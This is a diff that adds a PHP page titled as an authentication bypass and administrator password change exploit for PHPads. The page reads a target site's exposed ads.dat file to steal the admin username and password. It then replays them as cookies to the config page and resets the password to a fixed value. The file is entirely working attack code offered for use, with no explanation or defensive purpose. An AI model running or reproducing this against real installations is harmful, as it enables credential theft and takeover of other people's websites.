@@ -1,0 +1,61 @@
+<title> PHPads Authentication Bypass  Exploit </title>
+<pre>
+PHPads Authentication Bypass / Administrator Password Change Exploit
+<form method="POST">
+Target  : <br><input type="text" name="target" value="<? if($_POST['target']) {echo $_POST['target']; }else{echo 'http://localhost:4545/phpads';} ?>" size="70" /><br /><input type="submit" name="submit" />
+</form>
+<?php
+function catchya($string, $start, $end)
+{
+	preg_match('/'.$start.'(.*)'.$end.'/', $string, $matches);
+	return $matches[1];
+}
+
+function login($target)
+{
+	$ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL,$target."/ads.dat");
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER,true);
+	$result = curl_exec($ch);
+	$username = catchya($result, "user=", "\n");
+	$password = catchya($result, "pass=", "\n");
+	return array($username,$password);
+	curl_close($ch);
+}
+
+function adminchange($target, $username, $password)
+{
+	$post = array('save' => '1',
+	'newlogin' => $username,
+	'newpass' => "htlover");
+	$ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL,$target);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);
+	curl_setopt($ch, CURLOPT_COOKIE, 'user='.$username.'; pass='.$password);
+	curl_setopt($ch,CURLOPT_POST,true);
+    curl_setopt($ch,CURLOPT_POSTFIELDS,$post);
+	$result = curl_exec($ch);
+	if(preg_match("/Code Generator/", $result))
+	{
+		return "<br><br><font color=green>Success !! Password changed </font><br>username: ".$username." | password: htlover";
+	}else{
+		return "Something wrong <br>";
+	}
+	curl_close($ch);
+}
+
+if (isset($_POST['submit']))
+{
+	$target = $_POST['target'];
+	//login($target, $username, $userid);
+	$logins = login($target);
+	echo "USERNAME :" . $logins[0]; // username
+	echo "<br>PASSWORD :" . $logins[1]; // password
+	echo adminchange($target.'/admin.php?action=config', $logins[0], $logins[1]);
+}
+
+
+
+
+?>
+</pre>
